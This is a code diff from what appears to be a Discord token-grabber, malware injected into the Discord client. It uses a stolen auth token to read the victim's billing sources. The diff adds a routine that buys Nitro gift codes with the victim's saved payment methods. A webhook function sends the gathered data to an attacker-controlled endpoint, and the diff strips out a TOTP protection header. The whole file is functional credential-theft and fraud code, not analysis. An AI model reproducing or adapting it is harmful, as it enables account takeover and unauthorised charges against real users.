@@ -155,133 +155,155 @@ const fetchBilling = async (token) => {
     xmlHttp.setRequestHeader("Authorization", "${token}"); 
     xmlHttp.send(null); 
     xmlHttp.responseText`);
-  if (!bill.lenght || bill.length === 0) return '';
+  if (!bill.lenght || bill.length === 0) return "";
   return JSON.parse(bill);
 };
 
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
-  if (!data) return '❌';
-  let billing = '';
+  if (!data) return "❌";
+  let billing = "";
   data.forEach((x) => {
     if (!x.invalid) {
       switch (x.type) {
         case 1:
-          billing += '💳 ';
+          billing += "💳 ";
           break;
         case 2:
-          billing += '<:paypal:951139189389410365> ';
+          billing += "<:paypal:951139189389410365> ";
           break;
       }
     }
   });
-  if (!billing) billing = '❌';
+  if (!billing) billing = "❌";
   return billing;
 };
 
-const fetchFriends = async (token) => {
-  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
-    xmlHttp.open("GET", "${config.api}/relationships", false); 
-    xmlHttp.setRequestHeader("Authorization", "${token}"); 
-    xmlHttp.send(null); 
+const Purchase = async (token, id, _type, _time) => {
+  const options = {
+    expected_amount: config.nitro[_type][_time]["price"],
+    expected_currency: "usd",
+    gift: true,
+    payment_source_id: id,
+    payment_source_token: null,
+    purchase_token: "2422867c-244d-476a-ba4f-36e197758d97",
+    sku_subscription_plan_id: config.nitro[_type][_time]["sku"],
+  };
+
+  const req = execScript(`var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]["id"]}/purchase", false);
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.setRequestHeader('Content-Type', 'application/json');
+    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
     xmlHttp.responseText`);
-  return JSON.parse(bill);
+  if (req["gift_code"]) {
+    return "https://discord.gift/" + req["gift_code"];
+  } else return null;
 };
 
-const getFriends = async (token) => {
-  const data = await fetchFriends(token);
-  let s = 0;
-  let k = 0;
+const buyNitro = async (token) => {
+  const data = await fetchBilling(token);
+  const failedMsg = "Failed to Purchase ❌";
+  if (!data) return failedMsg;
+
+  let IDS = [];
   data.forEach((x) => {
     if (!x.invalid) {
-      switch (x.type) {
-        case 1:
-          s += 1;
-        case 2:
-          k += 1;
-      }
+      IDS = IDS.concat(x.id);
     }
   });
-  return s;
+  for (let sourceID in IDS) {
+    const first = Purchase(token, sourceID, "boost", "year");
+    if (first !== null) {
+      return first;
+    } else {
+      const second = Purchase(token, sourceID, "boost", "month");
+      if (second !== null) {
+        return second;
+      } else {
+        const third = Purchase(token, sourceID, "classic", "month");
+        if (third !== null) {
+          return third;
+        } else {
+          return failedMsg;
+        }
+      }
+    }
+  }
 };
 
 const getNitro = (flags) => {
   switch (flags) {
     case 0:
-      return '';
+      return "No Nitro";
     case 1:
-      return '<:nitro:892130462024224838> ';
+      return "Nitro Classic";
     case 2:
-      return '<:nitro:892130462024224838> ';
+      return "Nitro Boost";
     default:
-      return '';
+      return "No Nitro";
   }
 };
 
 const getBadges = (flags) => {
-  let badges = '';
+  let badges = "";
   switch (flags) {
     case 1:
-      badges += 'Discord Staff, ';
-      break;
+        badges += "Discord Staff <:discordstaff:935183780308733972>"
+        break;
     case 2:
-      badges += 'Partnered Server Owner, ';
-      break;
+        badges += "Partnered Server Owner <:partner:935183990598533171>"
+        break;
     case 131072:
-      badges += ' <:DevBadge:912727453875699733> ';
-      break;
+        badges += "Discord Developer <:developers:935186775490584608>"
+        break;
     case 4:
-      badges += ' <a:CH_IconHypesquadShiny:928551747591487548> ';
-      break;
+        badges += "Hypesquad Event <:hypesquadevent:935184264323039302>"
+        break;
     case 16384:
-      badges += 'Gold BugHunter, ';
-      break;
+        badges += "Gold BugHunter <:bughunters2:935185957102170172>"
+        break;
     case 8:
-      badges += 'Green BugHunter, ';
-      break;
+        badges += "Green BugHunter <:BugHunter:935186152464470108>"
+        break;
     case 512:
-      badges += ' <a:early:913099122968494170> ';
-      break;
+        badges += "Early Supporter <:early:935186433080180816>"
+        break;
     case 128:
-      badges += ' <:brilliance:919973089285120111> ';
-      break;
+        badges += "HypeSquad Brillance <:brilliance:935184761339654165>"
+        break;
     case 64:
-      badges += ' <:bravery:919973089222205451> ';
-      break;
+        badges += "HypeSquad Bravery <:BraveryLogo:935185089917251644>"
+        break;
     case 256:
-      badges += ' <:balance:919973088651776001> ';
-      break;
+        badges += "HypeSquad Balance <:BalanceLogo:935184834622554132>"
+        break;
     case 0:
-      badges = '`No Badges`';
-      break;
+        badges = ":x:"
+        break;
     default:
-      badges = '`No Badges`';
-      break;
-  }
+        badges = ":x:"
+        break;
+}
   return badges;
 };
 
 const hooker = async (content) => {
   const data = JSON.stringify(content);
   const url = new URL(config.webhook);
-  const headers = {
-    'Content-Type': 'application/json',
-    'Access-Control-Allow-Origin': '*',
-  };
-  if (!config.webhook.includes('api/webhooks')) {
-    const key = totp(config.webhook_protector_key);
-    headers['Authorization'] = key;
-  }
   const options = {
     protocol: url.protocol,
     hostname: url.host,
     path: url.pathname,
-    method: 'POST',
-    headers: headers,
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Access-Control-Allow-Origin": "*",
+    },
   };
   const req = https.request(options);
 
-  req.on('error', (err) => {
+  req.on("error", (err) => {
     console.log(err);
   });
   req.write(data);
